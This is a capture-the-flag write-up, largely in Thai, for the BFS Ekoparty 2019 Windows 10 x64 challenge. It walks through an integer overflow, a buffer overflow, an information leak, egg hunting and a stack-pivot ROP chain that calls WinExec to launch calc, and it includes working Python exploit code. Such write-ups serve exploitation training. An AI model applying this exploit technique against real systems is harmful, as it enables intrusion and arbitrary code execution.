# Eko2019 - Windows 10 x64 [Info Leak, ASLR Bypass, ROP]

BFS Ekoparty 2019 Exploitation Challenge: [Link](https://labs.bluefrostsecurity.de/blog/2019/09/07/bfs-ekoparty-2019-exploitation-challenge/)

## Screenshot

![Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/2020-05-23_15-41-16.gif](Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/2020-05-23_15-41-16.gif)

## Normal Flow

หลังจากที่เรา Reverse Engineer Binary นี้เราจะพบ Flow การทำงานคร่าว ๆ เหมือนรูปนี้

![Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled.png](Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled.png)

## Vulnerability in Flow

ซึ่งจากการวิเคราะห์เราพบช่องโหว่หลัก ๆ 2 ถึง 3 ช่องโหว่(จริง ๆ ช่องโหว่ที่ 2-3 ค่อนข้าง Relate กัน)

![Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%201.png](Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%201.png)

### Vuln1: Integer Overflow

Integer Overflow ใน msg_size ทำให้เราสามารถส่ง Msg Packet มากกว่า 0x200 bytes ทำให้เกิด Buffer Overflow ได้

![Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%202.png](Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%202.png)

### Vuln2: Buffer Overflow

เมื่อเราสามารถทำ Buffer Overflow ได้พบกว่าเราสามารถควบคุมได้ 1 Byte ที่สามารถ Execute ได้ และควบคุม Register RCX ได้ 

![Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%203.png](Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%203.png)

### Vuln3: Information Leak

จากช่องโหว่ก่อนหน้านั่นหมายความว่าเราสามารถควบคุม Instruction ได้ประมาณ 255 คำสั่งซึ่งเราสามารถนำมาใช้ในการ Leak Address ต่าง ๆ ที่เราต้องการพร้อมทั้งสามารถ Trigger Buffer Overflow เพื่อควบคุม RIP ได้

![Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%204.png](Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%204.png)

## Exploitation

**Tested on:** Windows 10 x64 Build 1909
**Language:** Python3
**Technique:** Integer Overflow, Buffer Overflow, Information Leak, Stack Pivot, Return-Oriented Programming(ROP)
**Exploit:** [exploit.py](https://github.com/jusmistic/BFS-Ekoparty-ctf-2019/blob/master/exploit.py)

1. **Integer Overflow** 

    จากการที่เราทำการ Reverse Engineer เนี่ยเราพบว่าเพื่อเราส่ง Header Packet เข้าไปที่ Server แล้ว Server จะทำการตรวจสอบว่า Msg size ใน Header Packet เนี่ยน้อยกว่า 0x200 Bytes รึเปล่า

    ![Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%205.png](Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%205.png)

    จะเห็นว่าทำใช้ Jump Condition `jle` ซึ่งเป็น Condition ที่ใช้ Compare แบบ [Signed](https://stackoverflow.com/questions/27284895/how-to-compare-a-signed-value-and-an-unsigned-value-in-x86-assembly) และถูก Cast เป็น Unsign ด้วย `movzx` ([ref](https://www.aldeid.com/wiki/X86-assembly/Instructions/mov))

    ![Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%206.png](Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%206.png)

    ลองใช้ WinRepl เพื่อจำลองว่าเมื่อ `movzx` จะได้เป็นค่าจาก `0xffffffff` เป็น `0xffff`

    ![Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%207.png](Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%207.png)

    แล้วค่าใน eax จะถูกนำไปใช่ต่อไปเป็น len ของ recv() นั่นหมายความว่าเราสามารถส่งค่าได้มาก 0x200 Bytes แล้ว

2. **Buffer Overflow** 

    เมื่อเราสามารถส่งได้มากกว่า 0x200 bytes แล้วเราจึงลองส่ง Payload ไปหน้าตาแบบนี้

    ```
    [ "A"*0x200 ][ "B"*0x8 ][ "C"*0x8 ]
    ```

    จะพบว่าเมื่อเราไปไม่เกิด 0x210 Bytes Process จะไม่ Crash และสามารถควบคุม Executable ได้ 1 Byte(ตรงนี้ต้อง Reverse + Debug ด้วย debugger) กับอีก 1 Register 

    ![Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%208.png](Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%208.png)

3. **Information Leak**

    ตรงนี้เราพบแล้วว่าเราสามารถควบคุม XX ได้จาก Code ชุดนี้ `XX\x48\x8b\x01` เราเลยลอง Generate ชุด Gadget ต่าง ๆ ที่เราสามารถใช้งานได้ทั้งหมดโดยใช้ Code ของ [Capstone](https://www.capstone-engine.org/lang_python.html)  มาโม

    ```python
    from capstone import *

    # code = b'\xzz\x48\x8b\x01'
    template_code = b'\x48\x8b\x01'
    md = Cs(CS_ARCH_X86, CS_MODE_64)

    filter = ()

    f = open("asm_out", "w")
    for x in range(0x00,0xff):
        gen = bytes([x]) + template_code
        tmp = "-----------------\n"
        tmp += "XX => %s\n" %str(hex(x))
        for i in md.disasm(gen, 0x1):
            if i.mnemonic not in filter:
                tmp += "0x%x:\t%s\t%s\n" %(i.address, i.mnemonic, i.op_str)
        tmp += "-----------------\n"
        print(tmp)
        f.write(tmp)
    ```

    จะพบว่ามี gadget ที่เราสามารถทำไปใช้ประโยชน์ได้

    ```python
    XX => 0x65
    0x1:	mov	rax, qword ptr gs:[rcx]

    XX => 0x66
    0x1:	mov	rax, qword ptr [rcx]

    XX => 0x51
    0x1:	push	rcx
    0x2:	mov	rax, qword ptr [rcx]
    ```

    จากนั้นเราทำการ Leak ค่าต่าง ๆ ที่เราต้องการ(และไม่ต้องการ LOL) ออกมาด้วย Gadget `0x65` กับ `0x66` ลองอ่านอันนี้ 

    [Windows x64 - Find Kernel32.dll address [WinDbg]](https://www.notion.so/Windows-x64-Find-Kernel32-dll-address-WinDbg-502f66b617a646098a0a12e17fb32fa8)

4. **Egg Hunting หา Address ของ msg_buf** 

    ปกติเวลาเราจะ Execute command ผ่าน WinExec เนี่ยเราต้องการ Address ของ Command นั้น ๆ ด้วยซึ่งผมพยายามหา Gadget ที่ Leak Stack Address ออกมาแล้วมันไม่เจออ่ะ (หาทั้งใน Binary กับ Kernel32.dll เบย)

    เลยลองอีกวิธีคือ Leak จาก StackBase/StackLimit แล้วหามา Offset เอา

    [Windows x64 - StackBase/StackLimit [WinDbg]](https://www.notion.so/Windows-x64-StackBase-StackLimit-WinDbg-a7ed4be32ce04cdbb9890a58ac5f2a19)

    แต่ตอนแรกเลือกหา Offset จาก StackBase แล้วเอาไปคำนวนเลย สรุปว่า Address มันไม่ตรงแฮะ เลยต้องเปลี่ยนวิธี ในเมื่อเรามี StackBase/StackLimit แล้ว นั่นหมายความว่าเรารู้ว่ายังไง Address ของ Msg_buf ต้องอยู่ระหว่าง 2 Address นี้แน่ ๆ และเราสามารถ Leak Address ต่าง ๆ ออกมาได้(Gadget `0x66`) เลยลองมา Implement Egg Hunting เพื่อหา Address ดู

    ```python
    print("[!] Leaking msg_buf by egghunting...")
      for addr in range(stackBase-8, stackLimit, -8):
        s = connect()
        s.send(craft_header())
    		
        egg = b"\x41\42\x43\x44\x45\x46\x47\x48"
        msg = egg # Egg 
        msg += b"A"*(512-8)
        msg += b"\x66"  # mov rax, ptr qword [rcx]
        msg += b"\x00"*7 #padding for reverse_arr
        msg += p64(addr) #replace rcx <-- ImageBaseAddress + WinExec Offset

        s.send(msg)
        res = u64(s.recv(2048))
        # print("Addr:", p64(res))
        if res == u64(egg):
            print("[+] Leaked msg_buf Address :", str(hex(addr)))
            msg_buf_addr = p64(addr)
            break
        s.close() # close connection
        w8()
    ```

    วิธีการก็เหมือนกันการที่เราทำ Egg hunting ใน Shellcode เลยแต่เราเปลี่ยนมาทำใน Exploit เราแทน โดยเราจะแปะ egg ไว้หน้า Payload ของเราและทำการ Loop ไปใน Range ของ StackBase และ StackLimit จนกว่าจะเจอ egg ซึ่งเมื่อเจอเราก็สามารถคำนวนตำแหน่งต่าง ๆ ของ Payload เราได้

5. **Trigger Buffer Overflow ด้วย Stack Pivot**

    เราใช้ Gadget `0x51` ในการ Trigger Buffer Overflow ซึ่งจะทำการ Push ค่า RCX ลงไปใน Stack และทำการ ret นั้นหมายความว่าเราสามารถควบคุม RIP ได้จาก Gadget นี้
    ปกติเวลาเราทำ Buffer Overflow เนี่ยเราจะทำการ Input ให้เยอะกว่า Buffer แล้วให้ค่ามันไปทับที่ Ret Address

    ![Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%209.png](Eko2019%20Windows%2010%20x64%20Info%20Leak%20ASLR%20Bypass%20ROP%208f352c82d95141f6a0199e38207ab15b/Untitled%209.png)

    เอารูปมาจากสไลด์สมัยฝึกงานที่ Secure-D ใช้คุ้มจัด :P

    แต่ครั้งนี้เราไม่สามรถทำแบบนั้นได้ เพราะโปรแกรมจะ Crash และอีกอย่างคือเราสามารถ Input ได้แค่ 8 Bytes (จาก push rcx)

    สิ่งที่เราทำคือเราทำการเพิ่มค่า `rsp` ขึ้นมาแทนโดยใช้ Gadget นี้ 

    ```python
    # 0x14000158c: add esp, 0x78 ; ret  ;  (1 found) eko2019.exe
    ```

    เพราะว่าก่อนที่เราจะ `ret` เนี่ย `rsp` ของเราอยู่ห่างจากตำแหน่งของ msg_buf ที่ `0x68` Bytes เราต้องหา Gadget ที่เพิ่มค่าของ `rsp` ได้มากกว่า `0x68` Bytes (ถ้าลองไปอ่าน Writeup ของคนอื่นดูจะเห็นว่าแทบทุกคนใน Gadget นี้ เพราะใน Eko2019.exe มี Gadget นี้ตัวเดียวจริง ๆ ที่ผ่านเงื่อนไข)

    ```
    						V------- RSP 
    ["A"*0x10]["XXXXX..."]
    ```

    จากนั้นเราทำการ ROP เพื่อเปิดเครื่องคิดเลข

    ```python
    pop_rcx = p64(kernel32+0x27803)
    xor_rax_rax = p64(ImageBaseAddress+0x8c41)
    pop_rdx = p64(kernel32+0x1c450)
    calc_addr = p64(u64(msg_buf_addr)+0x38)
    pop_rsp = p64(ImageBaseAddress+0x1fd7)
    add_esp_0x78 = p64(ImageBaseAddress+0x158c)
    add_esp_0x58 = p64(ImageBaseAddress+0x1164)
    add_esp_0x28 = p64(ImageBaseAddress+0x160c)
    add_esp_0x10 = p64(ImageBaseAddress+0x8789)
    add_esp_0x38 = p64(ImageBaseAddress+0x2e71)

    s = connect()
    s.send(craft_header())

    msg = b"\x00\x00\x00\x00\x00\x00\x00\x00" # pop the calc
    msg += b"\x00"*8

    # R O P 🤟😎🤟 
    msg += pop_rcx
    msg += calc_addr
    msg += xor_rax_rax
    msg += pop_rdx
    msg += p64(1)
    # msg += b"B"*(0x8)
    msg += b"\x63\x61\x6c\x63\x00\x00\x00\x00"
    msg += b"A"*(0x38-0x8) # Alignment for add rsp, 0x38
    msg += p64(winExec) # Error here <-------- Need Fix by debug before function exe
    msg += add_esp_0x78 # 0x1c0-0x78 = 0x148
    msg += b"A"*0x78
    msg += add_esp_0x78 # 0x1c0-0x78-0x78 = 0xd0
    msg += b"A"*0x78
    msg += add_esp_0x78 # 0x1c0-0x78-0x78-0x78 = 0x58
    msg += b"A"*0x78
    msg += add_esp_0x38 

    msg += b"A"*(512-len(msg))
    msg += b"\x51" #push rcx
    msg += b"\x00"*7 #padding for reverse_arr
    msg += add_esp_0x78 #gadget to pivot stack

    s.send(msg)
    res = s.recv(2048)

    s.close() # close connection
    w8()
    ```

    